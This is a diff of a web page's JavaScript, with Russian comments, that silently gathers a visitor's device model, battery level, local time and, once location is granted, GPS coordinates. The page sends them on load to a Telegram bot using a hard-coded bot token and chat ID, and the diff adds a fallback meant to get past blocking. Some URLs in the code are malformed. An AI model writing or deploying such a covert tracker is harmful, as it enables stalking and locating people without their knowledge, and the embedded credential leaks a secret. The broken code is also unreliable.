@@ -63,36 +63,31 @@
         const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
         const TG_CHAT_ID = "6559747526"; 
 
-        // Максимально надежная функция отправки, защищенная от блокировок
-        function sendToTelegram(text) {
-            // Формируем прямую GET-ссылку для отправки сообщения
-            const url = `https://telegram.org{TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+        // Тот самый надежный метод отправки с прокси и резервным обходом
+        async function sendToTelegram(text) {
+            const targetUrl = `https://telegram.org{TG_TOKEN}/sendMessage`;
             
-            // Отправляем запрос методом скрытого создания картинки (работает без CORS ограничений)
-            const img = new Image();
-            img.src = url;
-        }
-
-        function getExactIphoneModel() {
-            const width = window.screen.width;
-            const height = window.screen.height;
-            const ratio = window.devicePixelRatio;
-
-            if (width === 430 && height === 932 && ratio === 3) return "iPhone 14 Pro Max / 15 Pro Max / 15 Plus";
-            if (width === 393 && height === 852 && ratio === 3) return "iPhone 14 Pro / 15 Pro / 15";
-            if (width === 428 && height === 926 && ratio === 3) return "iPhone 13 Pro Max / 14 Plus";
-            if (width === 390 && height === 844 && ratio === 3) return "iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
-            if (width === 414 && height === 896 && ratio === 3) return "iPhone 11 Pro Max / XS Max";
-            if (width === 375 && height === 812 && ratio === 3) return "iPhone 11 Pro / X / XS / 12 mini / 13 mini";
-            if (width === 414 && height === 896 && ratio === 2) return "iPhone 11 / XR";
-            if (width === 414 && height === 736 && ratio === 3) return "iPhone 6 Plus / 7 Plus / 8 Plus";
-            if (width === 375 && height === 667 && ratio === 2) return "iPhone 6 / 7 / 8 / SE (2020/2022)";
-            
-            return "Устройство Apple (iPhone/iPad)";
+            try {
+                // Основной метод отправки
+                await fetch(targetUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (e) {
+                // Резервный метод отправки "через картинку" на случай блокировок CORS
+                try {
+                    const fallbackUrl = `https://telegram.org{TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+                    const img = new Image();
+                    img.src = fallbackUrl;
+                } catch (err) {
+                    console.error("Ошибка отправки.");
+                }
+            }
         }
 
         async function getDeviceSpecs() {
-            let batteryLevel = "Блокируется системой (iOS)";
+            let batteryLevel = "Не поддерживается браузером (например, iOS)";
             let deviceModel = "Не определено";
 
             if (navigator.getBattery) {
@@ -106,16 +101,14 @@
                 try {
                     const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                     deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
-                } catch (e) {
-                    deviceModel = "Устройство Android";
-                }
+                } catch (e) {}
             } else {
                 if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                    deviceModel = getExactIphoneModel();
+                    deviceModel = "Устройство Apple (iOS)";
                 } else if (/Android/i.test(navigator.userAgent)) {
-                    deviceModel = "Устройство Android (Старый браузер)";
+                    deviceModel = "Устройство Android";
                 } else {
-                    deviceModel = "Персональный компьютер";
+                    deviceModel = "Персональный компьютер / Настольная ОС";
                 }
             }
 
@@ -125,35 +118,31 @@
         async function collectAnalytics(extraText = "") {
             const specs = await getDeviceSpecs();
             const localTime = new Date().toLocaleTimeString();
-            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
 
             const message = `📱 *Новый технический отчет*\n\n` +
                             `🤖 *Устройство:* ${specs.deviceModel}\n` +
                             `🔋 *Заряд батареи:* ${specs.batteryLevel}\n` +
-                            `🖥 *Разрешение:* ${screenRes}\n` +
                             `🕒 *Локальное время:* ${localTime}` + 
                             extraText;
 
-            sendToTelegram(message);
+            await sendToTelegram(message);
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Добавляем задержку в полсекунды перед отправкой первого отчета при входе, 
-            // чтобы дать скриптам прогрузиться без сбоев
-            setTimeout(() => {
-                collectAnalytics();
-            }, 500);
+            collectAnalytics();
         });
 
-        function requestLocation() {
+        async function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         
-                        // Прямая ссылка на Яндекс Карты
+                        // Создаем прямую ссылку на Яндекс Карты с точкой маркера
                         const yandexMapsUrl = `https://yandex.ru{lon},${lat}&whatshere%5Bzoom%5D=16`;
+                        
+                        // Красивый текст отчета для бота
                         const geoText = `\n\n🗺 *Определено местонахождение*:\n\n[Открыть на Яндекс Картах](${yandexMapsUrl})`;
                         
                         collectAnalytics(geoText);
